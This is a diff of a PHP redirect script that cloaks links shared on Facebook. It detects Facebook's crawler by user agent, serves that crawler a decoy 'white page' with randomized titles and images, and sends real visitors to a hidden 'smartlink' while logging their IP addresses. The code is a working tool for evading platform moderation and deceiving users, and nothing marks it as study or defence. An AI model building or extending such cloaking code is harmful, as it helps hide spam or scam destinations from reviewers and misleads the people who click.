@@ -1,33 +1,6 @@
 <?php
 require_once 'mobile_protection.php';
-
-function generateRandomString($length = 6) {
-    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
-    $str = '';
-    for ($i = 0; $i < $length; $i++) {
-        $str .= $chars[random_int(0, strlen($chars) - 1)];
-    }
-    return $str;
-}
-
-function generateImageShortCode() {
-    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
-    $code = '';
-    for ($i = 0; $i < 7; $i++) {
-        $code .= $chars[random_int(0, strlen($chars) - 1)];
-    }
-    return $code;
-}
-
-$fbAppId = '1604020986967005'; // Your Facebook App ID
-
-$botImages = [
-    'https://chatdatlng.biz.id/images/white1.jpg',
-    'https://chatdatlng.biz.id/images/white2.jpg',
-    'https://chatdatlng.biz.id/images/white3.jpg',
-    'https://chatdatlng.biz.id/images/white4.jpg',
-    'https://chatdatlng.biz.id/images/white5.jpg'
-];
+require_once 'desktop_protection.php';
 
 $token = $_GET['token'] ?? '';
 
@@ -52,22 +25,19 @@ if (!$linkData) {
     exit;
 }
 
-function isFacebookBot() {
-    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
-    $fbBots = ['facebookexternalhit', 'Facebot', 'Facebook'];
+$mobileProtection = new AdvancedMobileProtection();
+$desktopProtection = new DesktopProtection();
 
-    foreach ($fbBots as $bot) {
-        if (stripos($userAgent, $bot) !== false) {
-            return true;
-        }
-    }
-    return false;
+$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
+
+if ($desktopProtection->isDesktopFacebookBot($userAgent)) {
+    $desktopProtection->serveWhitePage($linkData);
 }
 
-if (isFacebookBot()) {
-    $title = htmlspecialchars($linkData['og']['title'] ?? '') . ' ' . generateRandomString();
-    $description = htmlspecialchars($linkData['og']['description'] ?? '') . ' ' . generateRandomString();
-    $image = $botImages[array_rand($botImages)] . '?v=' . generateRandomString(6);
+if ($mobileProtection->isMobileFacebookBot($userAgent)) {
+    $title = htmlspecialchars($linkData['og']['title'] ?? '') . ' ' . bin2hex(random_bytes(3));
+    $description = htmlspecialchars($linkData['og']['description'] ?? '') . ' ' . bin2hex(random_bytes(3));
+    $image = 'https://chatdatlng.biz.id/images/white_mobile.jpg?v=' . bin2hex(random_bytes(4));
     $url = htmlspecialchars('https://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']);
     header('Content-Type: text/html; charset=utf-8');
     echo <<<HTML
@@ -75,7 +45,7 @@ if (isFacebookBot()) {
 <html>
 <head>
     <title>{$title}</title>
-    <meta property="fb:app_id" content="{$fbAppId}" />
+    <meta property="fb:app_id" content="1604020986967005" />
     <meta property="og:title" content="{$title}" />
     <meta property="og:description" content="{$description}" />
     <meta property="og:image" content="{$image}" />
@@ -92,15 +62,14 @@ HTML;
     exit;
 }
 
-$protection = new AdvancedMobileProtection();
-$finalUrl = $protection->process($linkData['smartlink']);
+$finalUrl = $mobileProtection->process($linkData['smartlink']);
 
 $clicks = json_decode(file_get_contents(__DIR__ . '/clicks.json'), true) ?? [];
 $clicks[] = [
     'token' => $token,
     'timestamp' => time(),
     'ip' => $_SERVER['REMOTE_ADDR'] ?? '',
-    'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? '',
+    'user_agent' => $userAgent,
     'referrer' => $_SERVER['HTTP_REFERER'] ?? ''
 ];
 file_put_contents(__DIR__ . '/clicks.json', json_encode($clicks, JSON_PRETTY_PRINT));
